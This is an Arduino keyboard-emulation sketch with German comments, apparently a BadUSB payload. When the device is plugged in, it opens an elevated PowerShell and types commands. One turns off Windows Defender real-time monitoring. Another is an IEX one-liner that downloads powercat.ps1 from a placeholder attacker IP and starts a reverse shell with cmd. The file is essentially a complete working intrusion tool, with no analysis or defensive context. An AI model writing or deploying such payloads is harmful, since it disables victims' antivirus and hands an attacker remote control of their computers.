#include <Keyboard.h>
// 28.01.2025
void setup() {

  delay(2000);                          // 2Sek Verzögerung
  Keyboard.begin();                     // Tastatur starten
  delay(1000);                          // 1Sek Verzögerung

  
  // Drücke "Windows + R" (Öffnet das Ausführen-Fenster)
  Keyboard.press(MODIFIERKEY_GUI); // Windows-Taste
  delay(100);                     
  Keyboard.press(KEY_R);          // + R
  delay(100);                   // Kurzer Delay für die Kombination
  Keyboard.releaseAll();        // Lässt alle Tasten los

  delay(2000); // Warte, bis das Fenster geöffnet ist

  // Übers Ausführungsfenster PowerShell als Admin öffnen
  Keyboard.print("powershell Start-Process Powershell -Verb runAs"); 
  delay(3000);                   // Warte nach der Eingabe
  Keyboard.press(KEY_ENTER);   // Drücke "Enter"
  delay(100);
  Keyboard.releaseAll();        // Lässt alle Tasten los
  delay(7000); // Warte, bis PowerShell geöffnet ist
  Keyboard.print("Set-MpPreference -DisableRealtimeMonitoring $true");  // Deaktiviert den Echtzeitschutz
  delay(5000);                   // Warte nach der Eingabe 3sek
  Keyboard.press(KEY_ENTER);   // Drücke "Enter"
  delay(100);
  Keyboard.releaseAll(); 
  delay(3000);
  // Powershell Befehl um eine Datei vom Python WebServer des Angreifers herunterzuladen und sie auszuführen
  const char* command = "IEX(New-Object System.Net.WebClient).DownloadString('http://[Attacker-IP]/powercat.ps1');powercat -c [Attacker-IP] -p [Port] -e cmd";
  for (int i = 0; i < strlen(command); i++) {
    Keyboard.print(command[i]);   // Zeichen einzeln senden
    delay(20);                    // Kurze Verzögerung zwischen den Zeichen
  }

  delay(3000);
  Keyboard.press(KEY_ENTER);   // Drücke "Enter"
  delay(1000);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.end();             // Tastatur beenden
}

void loop() {
  // Keine Aktionen im Loop
}
